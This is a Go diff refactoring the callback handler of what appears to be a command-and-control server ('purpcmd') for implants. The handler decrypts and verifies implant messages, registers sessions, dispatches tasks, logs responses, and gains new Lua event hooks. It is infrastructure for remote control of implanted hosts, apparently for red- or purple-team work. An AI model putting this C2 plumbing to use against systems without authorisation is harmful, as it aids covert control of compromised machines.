@@ -1,4 +1,4 @@
-package implant
+package callback
 
 import (
 	"bytes"
@@ -8,10 +8,12 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	"purpcmd/implant"
+	impx "purpcmd/implant"
 	"purpcmd/internal"
 	"purpcmd/internal/encrypt"
+	"purpcmd/server/implant"
 	"purpcmd/server/log"
+	"purpcmd/server/lua"
 )
 
 func ParseCallback(d []byte, req *http.Request, name string) (uint16, []byte) {
@@ -26,25 +28,25 @@ func ParseCallback(d []byte, req *http.Request, name string) (uint16, []byte) {
 		if err != nil {
 			return internal.NIL, []byte{}
 		}
-		
+
 		r = bytes.NewReader(a)
 	} else {
-		imp := ImplantPtrByName(name)
+		imp := implant.ImplantPtrByName(name)
 		if imp == nil {
 			// error no session for given ID
-			return internal.NIL,[]byte{}
+			return internal.NIL, []byte{}
 		}
 
 		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(d)))
 		n, _ := base64.StdEncoding.Decode(dataB64, d)
 
-		if !imp.enc.HMACVerifyHash(dataB64[:n]) {
+		if !imp.Enc.HMACVerifyHash(dataB64[:n]) {
 			// error HMAC do not match
 			return internal.NIL, []byte{}
 		}
 
 		dataOrig := dataB64[:n][:len(dataB64[:n])-16]
-		data, err := imp.enc.AESCbcDecrypt(dataOrig)
+		data, err := imp.Enc.AESCbcDecrypt(dataOrig)
 		if err != nil {
 			// error problem with enc
 			panic(err)
@@ -52,8 +54,6 @@ func ParseCallback(d []byte, req *http.Request, name string) (uint16, []byte) {
 
 		r = bytes.NewReader(data)
 	}
-
-
 
 	var messageType uint16
 	err := binary.Read(r, binary.BigEndian, &messageType)
@@ -68,7 +68,6 @@ func ParseCallback(d []byte, req *http.Request, name string) (uint16, []byte) {
 	case internal.REG:
 		err = ParseAndReg(r, req)
 	case internal.CHK:
-
 		task, err = ParseCheck(r, req)
 	case internal.RSP:
 		err = ParseResponse(r, req)
@@ -79,7 +78,7 @@ func ParseCallback(d []byte, req *http.Request, name string) (uint16, []byte) {
 	return messageType, task
 }
 
-func ParseMetadata(r io.Reader, i *implant.ImplantMetadata) {
+func ParseMetadata(r io.Reader, i *impx.ImplantMetadata) {
 	binary.Read(r, binary.BigEndian, &i.PID)
 	binary.Read(r, binary.BigEndian, &i.SessionID)
 	binary.Read(r, binary.BigEndian, &i.OTS)
@@ -90,7 +89,7 @@ func ParseMetadata(r io.Reader, i *implant.ImplantMetadata) {
 }
 
 func ParseAndReg(r io.Reader, req *http.Request) error {
-	i := new(implant.ImplantMetadata)
+	i := new(impx.ImplantMetadata)
 	ParseMetadata(r, i)
 
 	var aedkey [16]byte
@@ -103,7 +102,7 @@ func ParseAndReg(r io.Reader, req *http.Request) error {
 	data := make([]byte, dataLen)
 	binary.Read(r, binary.BigEndian, &data)
 
-	dataS := bytes.Split(data, SEP)
+	dataS := bytes.Split(data, implant.SEP)
 	if len(dataS) != 3 {
 		return errors.New("data must have 3 entities and have")
 	}
@@ -112,27 +111,29 @@ func ParseAndReg(r io.Reader, req *http.Request) error {
 	i.User = string(dataS[2])
 
 	name := fmt.Sprintf("%d", i.SessionID)
-	if ImplantPtrByName(name) != nil {
+	if implant.ImplantPtrByName(name) != nil {
 		return errors.New("session/implant exists. can't register another with same name")
 	}
 
 	aesEnc := encrypt.EncryptImport(aedkey, aesiv)
 
-	imp := ImplantNew(name)
+	imp := implant.ImplantNew(name)
 	imp.ImplantSetMetadata(i)
 	imp.ImplantSetEncryption(aesEnc)
 	imp.ImplantSetRemoteSocket(req.RemoteAddr)
 	imp.ImplantAddImplant()
+
+	lua.LuaOnRegister(*imp)
 	return nil
 }
 
 // ParseCheck parse health check
 func ParseCheck(r io.Reader, req *http.Request) ([]byte, error) {
-	i := new(implant.ImplantMetadata)
+	i := new(impx.ImplantMetadata)
 	ParseMetadata(r, i)
 
 	name := fmt.Sprintf("%d", i.SessionID)
-	imp := ImplantPtrByName(name)
+	imp := implant.ImplantPtrByName(name)
 	if imp == nil {
 		return []byte{}, errors.New("no session with name")
 	}
@@ -142,17 +143,18 @@ func ParseCheck(r io.Reader, req *http.Request) ([]byte, error) {
 	if err != nil {
 		return []byte{}, nil
 	}
+	lua.LuaOnCheck(tid, data, *i, imp.Name, imp.UUID)
 
 	log.AsyncWriteStdoutInfo(fmt.Sprintf("Sending task %s of %d bytes to %s\n", string(tid[:]), len(data), imp.Name))
 	return []byte(data), nil
 }
 
 func ParseResponse(r io.Reader, req *http.Request) error {
-	i := new(implant.ImplantMetadata)
+	i := new(impx.ImplantMetadata)
 	ParseMetadata(r, i)
 
 	name := fmt.Sprintf("%d", i.SessionID)
-	imp := ImplantPtrByName(name)
+	imp := implant.ImplantPtrByName(name)
 	if imp == nil {
 		return errors.New("no session with name")
 	}
@@ -162,7 +164,7 @@ func ParseResponse(r io.Reader, req *http.Request) error {
 	binary.Read(r, binary.BigEndian, &TaskID)
 
 	TaskIDStr := TaskID
-	taskPtr := TaskGetPtrById(name, TaskIDStr)
+	taskPtr := implant.TaskGetPtrById(name, TaskIDStr)
 	if taskPtr == nil {
 		return errors.New("no task with given id")
 	}
@@ -172,6 +174,8 @@ func ParseResponse(r io.Reader, req *http.Request) error {
 	respPayload := make([]byte, respLen)
 	binary.Read(r, binary.BigEndian, &respPayload)
 	taskPtr.TaskSetResponsePayload(respPayload)
+
+	lua.LuaOnResponse(TaskID, string(respPayload), imp.Metadata,imp.Name, imp.UUID)
 
 	log.AsyncWriteStdoutInfo(fmt.Sprintf("Response - session:%s task:%s length:%d\n\n%s\n\n", name, TaskIDStr, respLen, respPayload))
 	return nil
